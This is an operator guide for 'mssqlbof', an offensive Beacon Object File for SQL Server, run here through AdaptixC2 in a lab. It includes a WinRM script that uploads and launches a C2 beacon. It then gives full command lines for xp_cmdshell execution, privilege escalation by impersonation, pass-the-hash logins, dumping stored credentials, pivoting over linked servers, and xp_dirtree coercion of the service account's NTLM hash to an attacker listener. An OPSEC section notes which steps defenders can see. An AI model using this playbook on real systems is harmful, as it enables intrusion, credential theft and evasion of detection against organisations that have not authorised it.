# mssqlbof — operator guide (lab validation)

This walks through deploying `mssqlbof` via AdaptixC2 and running every action against a real SQL Server. Use it to validate your build before taking it to an engagement.

## Prerequisites

1. `make` produces `build/mssql.x64.o` and `build/mssql.x86.o`. That is the entire product — one BOF per architecture.
2. AdaptixC2 server + client running, default profile (`4321`, password `pass`).
3. A lab Windows host reachable on the network with WinRM enabled.
4. A Microsoft SQL Server instance reachable from the Windows host (2012+, Developer/Express/Standard/Enterprise all work).

## Step 1: Build

```bash
cd /path/to/mssqlbof
make
ls build/*.x64.o build/*.x86.o
```

Expected:

```
build/mssql.x64.o
build/mssql.x86.o
```

Around 48 KB each. If you see any other files, you are running an old tree — the current repo builds a single unified BOF.

## Step 2: Create an Adaptix listener

In **AdaptixClient → Listeners → Create**:

| Field | Value |
|---|---|
| Name | `MSSQLBOF-HTTP` |
| Type | `BeaconHTTP` |
| Host & port (Bind) | `0.0.0.0` / `8443` |
| Callback addresses | `<your-server-ip>:8443` |
| Method | `POST` |
| URI | `/api/v1/data` |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` |
| Heartbeat Header | `X-Beacon-Id` |
| SSL | unchecked |

Click **Create**. The listener should appear active.

## Step 3: Generate a beacon

In **AdaptixClient → Agents → Generate**:

| Field | Value |
|---|---|
| Listener | `MSSQLBOF-HTTP` |
| Agent | `beacon` |
| OS | `Windows` |
| Architecture | `x64` |
| Format | `Executable (EXE)` |
| Sleep | `5` |
| Jitter | `20` |

Save the resulting `.exe` to `/tmp/agent.exe`.

## Step 4: Deploy the agent

```bash
WIN_HOST=192.168.0.122
WIN_USER=Administrator

python3 - <<'PY'
import base64, winrm, os
WIN_PASS = os.environ['WIN_PASS']
s = winrm.Session(f'http://{os.environ["WIN_HOST"]}:5985/wsman',
                  auth=(WIN_USER, WIN_PASS), transport='ntlm')
with open('/tmp/agent.exe', 'rb') as f:
    data = f.read()
b64 = base64.b64encode(data).decode()
for i in range(0, len(b64), 4096):
    chunk = b64[i:i+4096]
    op = '>' if i == 0 else '>>'
    s.run_ps(f'$b="{chunk}"; [IO.File]::AppendAllText("C:\\Windows\\Temp\\agent.b64",$b)')
s.run_ps('certutil -decode C:\\Windows\\Temp\\agent.b64 C:\\Windows\\Temp\\agent.exe; '
         'Start-Process C:\\Windows\\Temp\\agent.exe')
PY
```

A beacon should appear in AdaptixClient within ~10 seconds.

## Step 5: Run the BOF

In the agent console, use `execute bof` with `mssql.x64.o` and `--action <verb>`.

### `find` — LDAP enum of `MSSQLSvc` SPNs (no SQL needed)

```
execute bof build/mssql.x64.o --action find
```

Expected: a table of every `MSSQLSvc` SPN in the current forest.

### `info` — connect + show identity

```
execute bof build/mssql.x64.o --action info --host SQL01 --auth sspi
```

Expected:

```
[*] connected as SILENTSTRIKE\alice @ SQL01\SQLEXPRESS
Server         : SQL01\SQLEXPRESS
Version        : 15.0.2000.5 (Express Edition (64-bit))
Current user   : SILENTSTRIKE\alice
Is sysadmin    : YES
Current DB     : master
Banner         : Microsoft SQL Server 2019 (RTM) ...
```

Substitute whatever auth mode you need:

```
# current beacon token
--auth sspi

# explicit NTLM plaintext
--auth ntlm --domain SILENTSTRIKE --user Administrator --pass P@ssw0rd

# pass-the-hash (no password, just NT hash)
--auth ntlm --domain SILENTSTRIKE --user Administrator --hash e19ccf75ee54e06b06a5907af13cef42

# SQL auth
--auth sql --user sa --pass SqlPass123!
```

### `query` — arbitrary T-SQL

```
execute bof build/mssql.x64.o --action query --host SQL01 --auth sspi --sql SELECT name FROM sys.databases
execute bof build/mssql.x64.o --action query --host SQL01 --auth sql --user sa --pass X --sql SELECT @@VERSION
```

The `--sql` flag consumes every token until the next `--flag` or end of args, so you do not need to quote multi-word SQL for your C2. Quote it or leave it bare — both work.

### `links` — linked-server enum

```
execute bof build/mssql.x64.o --action links --host SQL01 --auth sspi
```

Single-hop; recursive walk is v0.2.

### `exec` — code execution via `xp_cmdshell`

```
execute bof build/mssql.x64.o --action exec --host SQL01 --auth sspi --cmd whoami
```

Auto-enables `xp_cmdshell`, runs the command, captures stdout, restores the prior configuration. `--no-restore` skips the restore.

If the authenticating login is not sysadmin, `exec` auto-dispatches through the privesc machinery (`--impersonate auto` by default). Override with:

```
--impersonate login         EXECUTE AS LOGIN via an IMPERSONATE grant
--impersonate trustworthy   hop through dbo of a sysadmin-owned TRUSTWORTHY db
--impersonate none          fail if not sysadmin (no privesc attempt)
```

### `impersonate` — SQL privesc via `EXECUTE AS LOGIN`

```
execute bof build/mssql.x64.o --action impersonate --host SQL01 --auth sql --user lowuser --pass X --discover
execute bof build/mssql.x64.o --action impersonate --host SQL01 --auth sql --user lowuser --pass X --login sa --sql SELECT IS_SRVROLEMEMBER('sysadmin')
```

### `privesc` — enumerate the privesc surface

```
execute bof build/mssql.x64.o --action privesc --host SQL01 --auth sql --user lowuser --pass X
```

Six-section report: sysadmin membership, IMPERSONATE grants, TRUSTWORTHY databases owned by a sysadmin, linked servers, server-level permissions, and `xp_cmdshell` state. Read this before picking an `exec` privesc method.

### `coerce` — SMB auth coercion via `xp_dirtree`

```
execute bof build/mssql.x64.o --action coerce --host SQL01 --auth sspi --to "\\listener.attacker.tld\x"
```

Triggers the SQL service account to authenticate to your listener. Point this at `responder` / `ntlmrelayx` / `impacket-smbserver` for a NetNTLMv2 capture.

### `passwords` — dump `sys.linked_logins` and `sys.credentials`

```
execute bof build/mssql.x64.o --action passwords --host SQL01 --auth sspi
```

Requires `VIEW SERVER STATE` or sysadmin for the full dump.

### `chain` — `EXEC (...) AT [linked_server]`

```
execute bof build/mssql.x64.o --action chain --host SQL01 --auth sspi --via PROD_LINK --sql SELECT SUSER_NAME()
```

Pass-through to a linked server. Runs under the linked-login mapping configured on the first hop.

## Step 6: Verify cross-C2 portability

The same `mssql.x64.o` works in any C2 that honors the canonical Beacon API:

- **AdaptixC2**: `execute bof /path/to/mssql.x64.o --action ...`
- **Cobalt Strike**: load an aggressor that wraps `beacon_inline_execute`, then `mssql_action ...`
- **Havoc**: `inline-execute /path/to/mssql.x64.o go <args>`
- **Sliver**: use the Beacon Object File loader — `coff-loader -e go mssql.x64.o`
- **Metasploit**: `execute_bof mssql.x64.o go <args>`
- **PoshC2**: `bof mssql.x64.o <args>`
- **BruteRatel** / **Nighthawk** / **Outflank Stage1**: their respective `execute bof` command

If one C2 works, the rest follow — there is no framework-specific code in the BOF.

## Troubleshooting

**`connect failed (-1): recv() failed or eof`**
TCP connection dropped. The server closed the socket. Most common causes: wrong SPN for `--auth sspi`, wrong port (default 1433), firewall, or SQL Server rejecting a malformed LOGIN7.

**`connect failed (-2): Schannel handshake failed`**
TLS handshake failed. Schannel cert validation is off by default, so a self-signed cert is fine. This usually means the server does not support TLS 1.2 or the cipher suite negotiation failed.

**`connect failed (-3): InitializeSecurityContextW failed`**
Kerberos / NTLM authentication failed. Possibilities:
- The current beacon thread token has no AD identity — use `make_token` first or switch to `--auth ntlm` / `--auth sql`.
- The `MSSQLSvc/<host>:<port>` SPN does not exist in AD for Kerberos.
- The beacon process cannot reach the DC.

**`Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.`**
NTLMv2 validation failed at the DC. Either the hash (for `--auth ntlm --hash`) is wrong, or the user/domain combination does not exist in AD, or the user is disabled/locked.

**`SQL Error 18456`**
SQL Server rejected the login at the database layer. Compare the user you are logging in as against `sys.server_principals` — it probably does not exist.

**`SQL Error 297` on `--action exec`**
The authenticating login is not sysadmin and privesc failed to find a path. Run `--action privesc` first to see what paths are available, then pick one explicitly with `--impersonate login|trustworthy`.

## OPSEC reminder

Read `OPSEC.md` before running any of this on a real engagement. Short version:

- `find` — invisible
- `info` / `query` / `links` / `privesc` / `passwords` — only visible if SQL audit is on
- `exec` — **loud**: `sp_configure` events in the default trace, and `sqlservr.exe → cmd.exe` in the EDR process tree
- `impersonate` / `exec --impersonate login` — `EXECUTE AS LOGIN` audit events 33205 + 33206
- `coerce` — `xp_dirtree` to an external UNC is a defender IOC, but the payoff is the SQL service account's NetNTLMv2 hash
- `chain` — `EXEC AT` linked-server pass-through visible to the first-hop default trace
